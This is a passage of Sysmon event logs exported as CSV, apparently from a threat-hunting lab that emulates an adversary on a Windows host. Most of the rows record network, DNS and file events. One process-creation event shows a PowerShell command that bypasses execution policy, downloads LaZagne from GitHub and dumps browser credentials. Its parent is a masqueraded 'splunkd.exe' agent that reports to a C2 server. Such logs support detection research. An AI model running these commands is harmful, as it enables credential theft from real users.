12-12T16:59:43.000-0500",allowed,,,"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",,,,,,"2024-12-12 21:59:42.423",,"cdn-185-199-108-133.github.com","cdn-185-199-108-133.github.com","185.199.108.133",,,443,outbound,WindowsTarget,"10.0.0.5",WindowsTarget,99892,"endpoint_services_processes ms-sysmon-network windows_event_signature windows_ta_data",,,,,,,,WindowsTarget,,,99892,main,1,,,,,,,,,,,,,,,,,,,,,,,,,,"powershell.exe","{8e02ef74-5ccd-675b-5508-000000002a00}",,10624,,"powershell.exe",,,ip,ipv4,"<_='://../////'><><_='--'_='{----}'/><></><></><><",,,,,,,,,,,,,,,,,,,,,,informational,4,"Network connection",3,"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",XmlWinEventLog,FedoraThreatHunting,,"WindowsTarget.gwvavixz1yzuxgweuyqj3hytvf.ux.internal.cloudapp.net",,,"WindowsTarget.gwvavixz1yzuxgweuyqj3hytvf.ux.internal.cloudapp.net","10.0.0.5",,,,54494,,,,,established,,,,,,"communicate
network
track_event_signatures",,,,"communicate
network
track_event_signatures",,,tcp,"tcp/443",,,,,inf808,,,"'S-1-5-18'",,,,,"Microsoft Sysmon"
,,,,,,,,,,,,,,,"Microsoft-Windows-Sysmon/Operational",,,,,,,,,WindowsTarget,,,,,,,,"lb-140-82-112-4-iad.github.com","140.82.112.4",false,443,https,,,,,,"Microsoft-Windows-Sysmon/Operational",3,"<Data Name='RuleName'>-</Data><Data Name='UtcTime'>2024-12-12 21:59:42.291</Data><Data Name='ProcessGuid'>{8e02ef74-5ccd-675b-5508-000000002a00}</Data><Data Name='ProcessId'>10624</Data><Data Name='Image'>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data><Data Name='User'>WindowsTarget\inf808</Data><Data Name='Protocol'>tcp</Data><Data Name='Initiated'>true</Data><Data Name='SourceIsIpv6'>false</Data><Data Name='SourceIp'>10.0.0.5</Data><Data Name='SourceHostname'>WindowsTarget.gwvavixz1yzuxgweuyqj3hytvf.ux.internal.cloudapp.net</Data><Data Name='SourcePort'>54493</Data><Data Name='SourcePortName'>-</Data><Data Name='DestinationIsIpv6'>false</Data><Data Name='DestinationIp'>140.82.112.4</Data><Data Name='DestinationHostname'>lb-140-82-112-4-iad.github.com</Data><Data Name='DestinationPort'>443</Data><Data Name='DestinationPortName'>https</Data>","Network connection",3,99891,,,,,,,,,,,"'{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'",,,,,"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",,,true,,,,,0x8000000000000000,4,,,,,,,,,,,,,,,,,,,,"'Microsoft-Windows-Sysmon'",,,,,,,,,,,,,0,,,,,,,,,,,,,,"{8e02ef74-5ccd-675b-5508-000000002a00}","'3780'",10624,,,,,,tcp,,,,99891,99891,,,,,"-",,,,,"S-1-5-18",,"WindowsTarget.gwvavixz1yzuxgweuyqj3hytvf.ux.internal.cloudapp.net","10.0.0.5",false,,54493,"-",,,,,,,,,,,,,,,"'2024-12-12T21:59:43.4558705Z'","<Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>3</EventID><Version>5</Version><Level>4</Level><Task>3</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-12-12T21:59:43.4558705Z'/><EventRecordID>99891</EventRecordID><Correlation/><Execution ProcessID='3780' ThreadID='3880'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WindowsTarget</Computer><Security UserID='S-1-5-18'/>",,,,,,,,,,,,,,,,,3,Printers,,"'3880'","2024-12-12T21:59:43.4558705Z",,,,,"WindowsTarget\inf808","'S-1-5-18'",,,,,,,,,,"2024-12-12 21:59:42.291",5,,,,,"<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>3</EventID><Version>5</Version><Level>4</Level><Task>3</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-12-12T21:59:43.4558705Z'/><EventRecordID>99891</EventRecordID><Correlation/><Execution ProcessID='3780' ThreadID='3880'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WindowsTarget</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2024-12-12 21:59:42.291</Data><Data Name='ProcessGuid'>{8e02ef74-5ccd-675b-5508-000000002a00}</Data><Data Name='ProcessId'>10624</Data><Data Name='Image'>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data><Data Name='User'>WindowsTarget\inf808</Data><Data Name='Protocol'>tcp</Data><Data Name='Initiated'>true</Data><Data Name='SourceIsIpv6'>false</Data><Data Name='SourceIp'>10.0.0.5</Data><Data Name='SourceHostname'>WindowsTarget.gwvavixz1yzuxgweuyqj3hytvf.ux.internal.cloudapp.net</Data><Data Name='SourcePort'>54493</Data><Data Name='SourcePortName'>-</Data><Data Name='DestinationIsIpv6'>false</Data><Data Name='DestinationIp'>140.82.112.4</Data><Data Name='DestinationHostname'>lb-140-82-112-4-iad.github.com</Data><Data Name='DestinationPort'>443</Data><Data Name='DestinationPortName'>https</Data></EventData></Event>","2024-12-12T16:59:43.000-0500",allowed,,,"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",,,,,,"2024-12-12 21:59:42.291",,"lb-140-82-112-4-iad.github.com","lb-140-82-112-4-iad.github.com","140.82.112.4",,,443,outbound,WindowsTarget,"10.0.0.5",WindowsTarget,99891,"endpoint_services_processes ms-sysmon-network windows_event_signature windows_ta_data",,,,,,,,WindowsTarget,,,99891,main,1,,,,,,,,,,,,,,,,,,,,,,,,,,"powershell.exe","{8e02ef74-5ccd-675b-5508-000000002a00}",,10624,,"powershell.exe",,,ip,ipv4,"<_='://../////'><><_='--'_='{----}'/><></><></><><",,,,,,,,,,,,,,,,,,,,,,informational,4,"Network connection",3,"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",XmlWinEventLog,FedoraThreatHunting,,"WindowsTarget.gwvavixz1yzuxgweuyqj3hytvf.ux.internal.cloudapp.net",,,"WindowsTarget.gwvavixz1yzuxgweuyqj3hytvf.ux.internal.cloudapp.net","10.0.0.5",,,,54493,,,,,established,,,,,,"communicate
network
track_event_signatures",,,,"communicate
network
track_event_signatures",,,tcp,"tcp/443",,,,,inf808,,,"'S-1-5-18'",,,,,"Microsoft Sysmon"
,,,,,,,,,,,,,,,"Microsoft-Windows-Sysmon/Operational",,,,,,,,,WindowsTarget,,,,,,,,,,,,,,,,,,"Microsoft-Windows-Sysmon/Operational",22,"<Data Name='RuleName'>-</Data><Data Name='UtcTime'>2024-12-12 21:59:42.425</Data><Data Name='ProcessGuid'>{8e02ef74-5ccd-675b-5508-000000002a00}</Data><Data Name='ProcessId'>10624</Data><Data Name='QueryName'>objects.githubusercontent.com</Data><Data Name='QueryStatus'>0</Data><Data Name='QueryResults'>::ffff:185.199.108.133;::ffff:185.199.109.133;::ffff:185.199.110.133;::ffff:185.199.111.133;</Data><Data Name='Image'>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data><Data Name='User'>WindowsTarget\inf808</Data>","DNSEvent (DNS query)",22,99890,,,,,,,,,,,"'{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'",,,,,"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",,,,,,,,0x8000000000000000,4,,,,,,,,,,,,,,,,,,,,"'Microsoft-Windows-Sysmon'",,,,,,,,,,,,,0,,,,,,,,,,,,,,"{8e02ef74-5ccd-675b-5508-000000002a00}","'3780'",10624,,,,,,,"objects.githubusercontent.com","::ffff:185.199.108.133;::ffff:185.199.109.133;::ffff:185.199.110.133;::ffff:185.199.111.133;",0,99890,99890,,,,,"-",,,,,"S-1-5-18",,,,,,,,,,,,,,,,,,,,,,"'2024-12-12T21:59:43.2960234Z'","<Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>22</EventID><Version>5</Version><Level>4</Level><Task>22</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-12-12T21:59:43.2960234Z'/><EventRecordID>99890</EventRecordID><Correlation/><Execution ProcessID='3780' ThreadID='11920'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WindowsTarget</Computer><Security UserID='S-1-5-18'/>",,,,,,,,,,,,,,,,,22,,,"'11920'","2024-12-12T21:59:43.2960234Z",,,,,"WindowsTarget\inf808","'S-1-5-18'",,,,,,,,,,"2024-12-12 21:59:42.425",5,,,,,"<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>22</EventID><Version>5</Version><Level>4</Level><Task>22</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-12-12T21:59:43.2960234Z'/><EventRecordID>99890</EventRecordID><Correlation/><Execution ProcessID='3780' ThreadID='11920'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WindowsTarget</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2024-12-12 21:59:42.425</Data><Data Name='ProcessGuid'>{8e02ef74-5ccd-675b-5508-000000002a00}</Data><Data Name='ProcessId'>10624</Data><Data Name='QueryName'>objects.githubusercontent.com</Data><Data Name='QueryStatus'>0</Data><Data Name='QueryResults'>::ffff:185.199.108.133;::ffff:185.199.109.133;::ffff:185.199.110.133;::ffff:185.199.111.133;</Data><Data Name='Image'>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data><Data Name='User'>WindowsTarget\inf808</Data></EventData></Event>","2024-12-12T16:59:43.000-0500",,"::ffff:185.199.108.133
::ffff:185.199.109.133
::ffff:185.199.110.133
::ffff:185.199.111.133",4,,,,,,,,,,,,,,,,WindowsTarget,,WindowsTarget,99890,"endpoint_services_processes ms-sysmon-dns windows_event_signature windows_ta_data",,,,,,,,WindowsTarget,,,99890,main,1,,,,,,,,,,,,,,,,,,,,,,,,,,"powershell.exe","{8e02ef74-5ccd-675b-5508-000000002a00}",,,,"powershell.exe",,,,,"<_='://../////'><><_='--'_='{----}'/><></><></><><","objects.githubusercontent.com",1,,,,,,,,,0,,,,,,,,,,,informational,4,"DNSEvent (DNS query)",22,"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",XmlWinEventLog,FedoraThreatHunting,,WindowsTarget,,,,,,,,,,,,,,,,,,,"dns
network
resolution
track_event_signatures",,,,"dns
network
resolution
track_event_signatures",,,,,,,,,inf808,,,"'S-1-5-18'",,,,,"Microsoft Sysmon"
,,,,,,,,,,,,,,,"Microsoft-Windows-Sysmon/Operational",,,,,,,,,WindowsTarget,,,,,,,,,,,,,,,,,,"Microsoft-Windows-Sysmon/Operational",22,"<Data Name='RuleName'>-</Data><Data Name='UtcTime'>2024-12-12 21:59:42.275</Data><Data Name='ProcessGuid'>{8e02ef74-5ccd-675b-5508-000000002a00}</Data><Data Name='ProcessId'>10624</Data><Data Name='QueryName'>github.com</Data><Data Name='QueryStatus'>0</Data><Data Name='QueryResults'>::ffff:140.82.112.4;</Data><Data Name='Image'>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data><Data Name='User'>WindowsTarget\inf808</Data>","DNSEvent (DNS query)",22,99889,,,,,,,,,,,"'{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'",,,,,"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",,,,,,,,0x8000000000000000,4,,,,,,,,,,,,,,,,,,,,"'Microsoft-Windows-Sysmon'",,,,,,,,,,,,,0,,,,,,,,,,,,,,"{8e02ef74-5ccd-675b-5508-000000002a00}","'3780'",10624,,,,,,,"github.com","::ffff:140.82.112.4;",0,99889,99889,,,,,"-",,,,,"S-1-5-18",,,,,,,,,,,,,,,,,,,,,,"'2024-12-12T21:59:43.2959479Z'","<Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>22</EventID><Version>5</Version><Level>4</Level><Task>22</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-12-12T21:59:43.2959479Z'/><EventRecordID>99889</EventRecordID><Correlation/><Execution ProcessID='3780' ThreadID='11920'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WindowsTarget</Computer><Security UserID='S-1-5-18'/>",,,,,,,,,,,,,,,,,22,,,"'11920'","2024-12-12T21:59:43.2959479Z",,,,,"WindowsTarget\inf808","'S-1-5-18'",,,,,,,,,,"2024-12-12 21:59:42.275",5,,,,,"<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>22</EventID><Version>5</Version><Level>4</Level><Task>22</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-12-12T21:59:43.2959479Z'/><EventRecordID>99889</EventRecordID><Correlation/><Execution ProcessID='3780' ThreadID='11920'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WindowsTarget</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2024-12-12 21:59:42.275</Data><Data Name='ProcessGuid'>{8e02ef74-5ccd-675b-5508-000000002a00}</Data><Data Name='ProcessId'>10624</Data><Data Name='QueryName'>github.com</Data><Data Name='QueryStatus'>0</Data><Data Name='QueryResults'>::ffff:140.82.112.4;</Data><Data Name='Image'>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data><Data Name='User'>WindowsTarget\inf808</Data></EventData></Event>","2024-12-12T16:59:43.000-0500",,"::ffff:140.82.112.4",1,,,,,,,,,,,,,,,,WindowsTarget,,WindowsTarget,99889,"endpoint_services_processes ms-sysmon-dns windows_event_signature windows_ta_data",,,,,,,,WindowsTarget,,,99889,main,1,,,,,,,,,,,,,,,,,,,,,,,,,,"powershell.exe","{8e02ef74-5ccd-675b-5508-000000002a00}",,,,"powershell.exe",,,,,"<_='://../////'><><_='--'_='{----}'/><></><></><><","github.com",1,,,,,,,,,0,,,,,,,,,,,informational,4,"DNSEvent (DNS query)",22,"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",XmlWinEventLog,FedoraThreatHunting,,WindowsTarget,,,,,,,,,,,,,,,,,,,"dns
network
resolution
track_event_signatures",,,,"dns
network
resolution
track_event_signatures",,,,,,,,,inf808,,,"'S-1-5-18'",,,,,"Microsoft Sysmon"
,,,,,,,,,,,,,,,"Microsoft-Windows-Sysmon/Operational",,,,,,,,,WindowsTarget,,,"2024-12-12 21:43:22.157",,,,,,,,,,,,,,,"Microsoft-Windows-Sysmon/Operational",11,"<Data Name='RuleName'>EXE</Data><Data Name='UtcTime'>2024-12-12 21:59:42.534</Data><Data Name='ProcessGuid'>{8e02ef74-5ccd-675b-5508-000000002a00}</Data><Data Name='ProcessId'>10624</Data><Data Name='Image'>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data><Data Name='TargetFilename'>C:\Users\inf808\AppData\Local\inf808\LaZagne.exe</Data><Data Name='CreationUtcTime'>2024-12-12 21:43:22.157</Data><Data Name='User'>WindowsTarget\inf808</Data>",FileCreate,11,99888,,,,,,,,,,,"'{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'",,,,,"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",,,,,,,,0x8000000000000000,4,,,,,,,,,,,,,,,,,,,,"'Microsoft-Windows-Sysmon'",,,,,,,,,,,,,0,,,,,,,,,,,,,,"{8e02ef74-5ccd-675b-5508-000000002a00}","'3780'",10624,,,,,,,,,,99888,99888,,,,,EXE,,,,,"S-1-5-18",,,,,,,,,,,,,,,,,,,,,,"'2024-12-12T21:59:42.5349183Z'","<Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>11</EventID><Version>2</Version><Level>4</Level><Task>11</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-12-12T21:59:42.5349183Z'/><EventRecordID>99888</EventRecordID><Correlation/><Execution ProcessID='3780' ThreadID='5104'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WindowsTarget</Computer><Security UserID='S-1-5-18'/>",,"C:\Users\inf808\AppData\Local\inf808\LaZagne.exe",,,,,,,,,,,,,,,11,"System Parameter Settings",,"'5104'","2024-12-12T21:59:42.5349183Z",,,,,"WindowsTarget\inf808","'S-1-5-18'",,,,,,,,,,"2024-12-12 21:59:42.534",2,,,,,"<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>11</EventID><Version>2</Version><Level>4</Level><Task>11</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-12-12T21:59:42.5349183Z'/><EventRecordID>99888</EventRecordID><Correlation/><Execution ProcessID='3780' ThreadID='5104'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WindowsTarget</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>EXE</Data><Data Name='UtcTime'>2024-12-12 21:59:42.534</Data><Data Name='ProcessGuid'>{8e02ef74-5ccd-675b-5508-000000002a00}</Data><Data Name='ProcessId'>10624</Data><Data Name='Image'>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data><Data Name='TargetFilename'>C:\Users\inf808\AppData\Local\inf808\LaZagne.exe</Data><Data Name='CreationUtcTime'>2024-12-12 21:43:22.157</Data><Data Name='User'>WindowsTarget\inf808</Data></EventData></Event>","2024-12-12T16:59:42.000-0500",modified,,,,,,,,,,,WindowsTarget,,,,,,,WindowsTarget,,WindowsTarget,99888,"endpoint_services_processes ms-sysmon-filemod windows_event_signature windows_ta_data",,"2024-12-12 21:43:22.157",,,"LaZagne.exe","C:\Users\inf808\AppData\Local\inf808\LaZagne.exe",,WindowsTarget,,,99888,main,1,,,,,,,,,,file,,,,,,,,,,,,,,,,"powershell.exe","{8e02ef74-5ccd-675b-5508-000000002a00}",,10624,,"powershell.exe","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",,,,"<_='://../////'><><_='--'_='{----}'/><></><></><><",,,,,,,,,,,,,,,,,,,,,,informational,4,FileCreate,11,"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",XmlWinEventLog,FedoraThreatHunting,,,,,,,,,,,,,,,,,,,,,"endpoint
filesystem
track_event_signatures",,,,"endpoint
filesystem
track_event_signatures",filesystem,,,,,,,,inf808,,,"'S-1-5-18'",,,,,"Microsoft Sysmon"
,,,,,,,,,,,,,,,"Microsoft-Windows-Sysmon/Operational",,,,,,,,,WindowsTarget,,,"2024-12-12 21:59:42.053",,,,,,,,,,,,,,,"Microsoft-Windows-Sysmon/Operational",11,"<Data Name='RuleName'>-</Data><Data Name='UtcTime'>2024-12-12 21:59:42.053</Data><Data Name='ProcessGuid'>{8e02ef74-5ccd-675b-5508-000000002a00}</Data><Data Name='ProcessId'>10624</Data><Data Name='Image'>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data><Data Name='TargetFilename'>C:\Users\inf808\AppData\Local\Temp\__PSScriptPolicyTest_nbbosa4w.b2j.ps1</Data><Data Name='CreationUtcTime'>2024-12-12 21:59:42.053</Data><Data Name='User'>WindowsTarget\inf808</Data>",FileCreate,11,99887,,,,,,,,,,,"'{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'",,,,,"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",,,,,,,,0x8000000000000000,4,,,,,,,,,,,,,,,,,,,,"'Microsoft-Windows-Sysmon'",,,,,,,,,,,,,0,,,,,,,,,,,,,,"{8e02ef74-5ccd-675b-5508-000000002a00}","'3780'",10624,,,,,,,,,,99887,99887,,,,,"-",,,,,"S-1-5-18",,,,,,,,,,,,,,,,,,,,,,"'2024-12-12T21:59:42.0638346Z'","<Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>11</EventID><Version>2</Version><Level>4</Level><Task>11</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-12-12T21:59:42.0638346Z'/><EventRecordID>99887</EventRecordID><Correlation/><Execution ProcessID='3780' ThreadID='5104'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WindowsTarget</Computer><Security UserID='S-1-5-18'/>",,"C:\Users\inf808\AppData\Local\Temp\__PSScriptPolicyTest_nbbosa4w.b2j.ps1",,,,,,,,,,,,,,,11,"System Parameter Settings",,"'5104'","2024-12-12T21:59:42.0638346Z",,,,,"WindowsTarget\inf808","'S-1-5-18'",,,,,,,,,,"2024-12-12 21:59:42.053",2,,,,,"<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>11</EventID><Version>2</Version><Level>4</Level><Task>11</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-12-12T21:59:42.0638346Z'/><EventRecordID>99887</EventRecordID><Correlation/><Execution ProcessID='3780' ThreadID='5104'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WindowsTarget</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2024-12-12 21:59:42.053</Data><Data Name='ProcessGuid'>{8e02ef74-5ccd-675b-5508-000000002a00}</Data><Data Name='ProcessId'>10624</Data><Data Name='Image'>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data><Data Name='TargetFilename'>C:\Users\inf808\AppData\Local\Temp\__PSScriptPolicyTest_nbbosa4w.b2j.ps1</Data><Data Name='CreationUtcTime'>2024-12-12 21:59:42.053</Data><Data Name='User'>WindowsTarget\inf808</Data></EventData></Event>","2024-12-12T16:59:42.000-0500",created,,,,,,,,,,,WindowsTarget,,,,,,,WindowsTarget,,WindowsTarget,99887,"endpoint_services_processes ms-sysmon-filemod windows_event_signature windows_ta_data",,"2024-12-12 21:59:42.053",,,"__PSScriptPolicyTest_nbbosa4w.b2j.ps1","C:\Users\inf808\AppData\Local\Temp\__PSScriptPolicyTest_nbbosa4w.b2j.ps1",,WindowsTarget,,,99887,main,1,,,,,,,,,,file,,,,,,,,,,,,,,,,"powershell.exe","{8e02ef74-5ccd-675b-5508-000000002a00}",,10624,,"powershell.exe","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",,,,"<_='://../////'><><_='--'_='{----}'/><></><></><><",,,,,,,,,,,,,,,,,,,,,,informational,4,FileCreate,11,"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",XmlWinEventLog,FedoraThreatHunting,,,,,,,,,,,,,,,,,,,,,"endpoint
filesystem
track_event_signatures",,,,"endpoint
filesystem
track_event_signatures",filesystem,,,,,,,,inf808,,,"'S-1-5-18'",,,,,"Microsoft Sysmon"
,,,,,,,,,,,,,,,"Microsoft-Windows-Sysmon/Operational",,,,,,,"powershell.exe -ExecutionPolicy Bypass -C ""$username = $env:USERNAME;$StageDir = \""C:\Users\$username\AppData\Local\$username\"";Invoke-WebRequest \""https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.5/LaZagne.exe\"" -OutFile \""$StageDir\LaZagne.exe\"";cmd /c \""$StageDir\LaZagne.exe browsers &gt; \""$StageDir\T1555003LaZagne_output.txt\""\""""","Microsoft Corporation",WindowsTarget,,,,,"C:\Users\inf808\Desktop\","Windows PowerShell",,,,,,,,,,,,"Microsoft-Windows-Sysmon/Operational",1,"<Data Name='RuleName'>-</Data><Data Name='UtcTime'>2024-12-12 21:59:41.963</Data><Data Name='ProcessGuid'>{8e02ef74-5ccd-675b-5508-000000002a00}</Data><Data Name='ProcessId'>10624</Data><Data Name='Image'>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data><Data Name='FileVersion'>10.0.19041.3996 (WinBuild.160101.0800)</Data><Data Name='Description'>Windows PowerShell</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>PowerShell.EXE</Data><Data Name='CommandLine'>powershell.exe -ExecutionPolicy Bypass -C ""$username = $env:USERNAME;$StageDir = \""C:\Users\$username\AppData\Local\$username\"";Invoke-WebRequest \""https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.5/LaZagne.exe\"" -OutFile \""$StageDir\LaZagne.exe\"";cmd /c \""$StageDir\LaZagne.exe browsers &gt; \""$StageDir\T1555003LaZagne_output.txt\""\""""</Data><Data Name='CurrentDirectory'>C:\Users\inf808\Desktop\</Data><Data Name='User'>WindowsTarget\inf808</Data><Data Name='LogonGuid'>{8e02ef74-4233-675b-e1fd-1f0000000000}</Data><Data Name='LogonId'>0x1ffde1</Data><Data Name='TerminalSessionId'>2</Data><Data Name='IntegrityLevel'>High</Data><Data Name='Hashes'>MD5=2E5A8590CF6848968FC23DE3FA1E25F1,SHA256=9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3,IMPHASH=3D08F4848535206D772DE145804FF4B6</Data><Data Name='ParentProcessGuid'>{8e02ef74-585e-675b-6007-000000002a00}</Data><Data Name='ParentProcessId'>11700</Data><Data Name='ParentImage'>C:\Users\Public\splunkd.exe</Data><Data Name='ParentCommandLine'>""C:\Users\Public\splunkd.exe"" -server http://10.0.0.4:8888 -group red </Data><Data Name='ParentUser'>WindowsTarget\inf808</Data>","Process creation",1,99886,,,"10.0.19041.3996 (WinBuild.160101.0800)",,,,,,,,"'{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'","MD5=2E5A8590CF6848968FC23DE3FA1E25F1,SHA256=9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3,IMPHASH=3D08F4848535206D772DE145804FF4B6",,,3D08F4848535206D772DE145804FF4B6,"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",,,,High,,,,0x8000000000000000,4,,,"{8e02ef74-4233-675b-e1fd-1f0000000000}",0x1ffde1,,,,,,,,,2E5A8590CF6848968FC23DE3FA1E25F1,,,,,,,"'Microsoft-Windows-Sysmon'",,,,,,,,,,,,,0,"PowerShell.EXE",,"""C:\Users\Public\splunkd.exe"" -server http://10.0.0.4:8888 -group red","C:\Users\Public\splunkd.exe","{8e02ef74-585e-675b-6007-000000002a00}",11700,"WindowsTarget\inf808",,,,,,,"{8e02ef74-5ccd-675b-5508-000000002a00}","'3780'",10624,,,,"Microsoft® Windows® Operating System",,,,,,99886,99886,,,,,"-",,9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3,,,"S-1-5-18",,,,,,,,,,,,,,,,,,,,,,"'2024-12-12T21:59:41.9651571Z'","<Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-12-12T21:59:41.9651571Z'/><EventRecordID>99886</EventRecordID><Correlation/><Execution ProcessID='3780' ThreadID='5104'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WindowsTarget</Computer><Security UserID='S-1-5-18'/>",,,,,,,,,,,,,,,,,1,Devices,2,"'5104'","2024-12-12T21:59:41.9651571Z",,,,,"WindowsTarget\inf808","'S-1-5-18'",,,,,,,,,,"2024-12-12 21:59:41.963",5,,,,,"<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-12-12T21:59:41.9651571Z'/><EventRecordID>99886</EventRecordID><Correlation/><Execution ProcessID='3780' ThreadID='5104'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WindowsTarget</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2024-12-12 21:59:41.963</Data><Data Name='ProcessGuid'>{8e02ef74-5ccd-675b-5508-000000002a00}</Data><Data Name='ProcessId'>10624</Data><Data Name='Image'>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data><Data Name='FileVersion'>10.0.19041.3996 (WinBuild.160101.0800)</Data><Data Name='Description'>Windows PowerShell</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>PowerShell.EXE</Data><Data Name='CommandLine'>powershell.exe -ExecutionPolicy Bypass -C ""$username = $env:USERNAME;$StageDir = \""C:\Users\$username\AppData\Local\$username\"";Invoke-WebRequest \""https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.5/LaZagne.exe\"" -OutFile \""$StageDir\LaZagne.exe\"";cmd /c \""$StageDir\LaZagne.exe browsers &gt; \""$StageDir\T1555003LaZagne_output.txt\""\""""</Data><Data 